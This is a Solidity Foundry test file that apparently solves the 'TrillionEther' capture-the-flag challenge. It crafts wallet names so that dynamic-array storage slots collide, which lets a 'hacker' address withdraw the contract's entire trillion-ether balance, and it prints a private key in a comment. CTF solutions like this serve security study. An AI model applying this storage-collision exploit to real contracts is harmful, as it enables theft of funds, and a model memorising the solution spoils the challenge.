// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;
import {Test, console} from "forge-std/Test.sol";
import {TrillionEther} from "../src/TrillionEther.sol";

contract TrillionEtherTest is Test {
    TrillionEther public trillionEther;

    function setUp() public {
        address deployer = address(0);
        vm.deal(deployer, 1_000_000_000_000 ether + 100 ether);
        vm.startPrank(deployer);
        trillionEther = (new TrillionEther){value: 1_000_000_000_000 ether}();
        vm.stopPrank();
    }

    function view_contract_slots(
        address contract_address,
        uint256[] memory slots
    ) public view {
        console.log("Slots Layout of contract: ", contract_address);
        for (uint256 i = 0; i < slots.length; i++) {
            bytes32 slot_info = vm.load(
                contract_address,
                bytes32(uint256(slots[i]))
            );
            // log as hex
            console.log("Slot %x : %x", slots[i], uint256(slot_info));
        }
    }

    function view_contract_3_slots(
        address contract_address,
        uint256[3] memory slots
    ) public view {
        console.log("Slots Layout of contract: ", contract_address);
        for (uint256 i = 0; i < slots.length; i++) {
            bytes32 slot_info = vm.load(
                contract_address,
                bytes32(uint256(slots[i]))
            );
            // log as hex
            console.log("Slot %x : %x", slots[i], uint256(slot_info));
        }
    }

    function dyn_array_ith_item(
        uint256 start_slot,
        uint256 i,
        uint256 item_slot_num
    ) public pure returns (uint256) {
        // start_slot is the slotID of the dynamic array
        // i is the index of the item in the dynamic array
        // item_slot_num is the number of slots for one item in the dynamic array
        // return the slotID of the i-th item in the dynamic array
        return uint256(keccak256(abi.encode(start_slot))) + i * item_slot_num;
    }

    function testCreateWallet() public {
        // address form private key e287d375759e52890fe51833a7b643e78b69689491ff42932de7928ef5dbb925
        address hacker = address(0xE9498002d5F4E1673489263e1750867C46c0B640);
        // "Alice" to bytes32
        bytes32 name_bytes32 = bytes32("Alice");
        vm.deal(hacker, 100 ether);
        vm.prank(hacker);
        console.log("Slots Layout before `createWallet(Alice)`");
        view_contract_3_slots(
            address(trillionEther),
            [uint256(0), uint256(1), uint256(2)]
        );
        trillionEther.createWallet(name_bytes32);
        console.log("Slots Layout after `createWallet(Alice)`");
        view_contract_3_slots(
            address(trillionEther),
            [uint256(0), uint256(1), uint256(2)]
        );
        // find the slotID of the i-th item of the wallet array
        uint256 wallet_slot = dyn_array_ith_item(0, uint256(name_bytes32), 3);
        view_contract_3_slots(
            address(trillionEther),
            [wallet_slot, wallet_slot + 1, wallet_slot + 2]
        );
        vm.stopPrank();
    }

    function testSolveChallenge() public {
        address hacker = address(0xE9498002d5F4E1673489263e1750867C46c0B640);
        assertEq(trillionEther.isSolved(), false);
        vm.deal(hacker, 100 ether);
        vm.prank(hacker);
        trillionEther.createWallet(bytes32(uint256(uint160(hacker)) - 1));
        vm.prank(hacker);
        trillionEther.createWallet(bytes32(uint256(uint160(hacker)) - 2));
        vm.prank(hacker);
        trillionEther.createWallet(bytes32(type(uint256).max - 1));
        uint256 WalletID = uint256(uint160(hacker) - 1) +
            uint256(2 * ((~uint256(0)) / 3));
        (bytes32 name, uint256 balance, address owner) = trillionEther.wallets(WalletID);
        // log name, balance, owner
        console.log("WalletID: %x", WalletID);
        console.log("name    : %x", uint256(name));
        console.log("balance : %x", balance);
        console.log("owner   : %x", uint256(uint160(owner)));
        vm.prank(hacker);
        trillionEther.withdraw(WalletID, 1_000_000_000_000 ether);
        assertEq(trillionEther.isSolved(), true);
        vm.stopPrank();
    }
}

// forge test --match-contract TrillionEtherTest -vv
// forge test --match-contract TrillionEtherTest -vvvv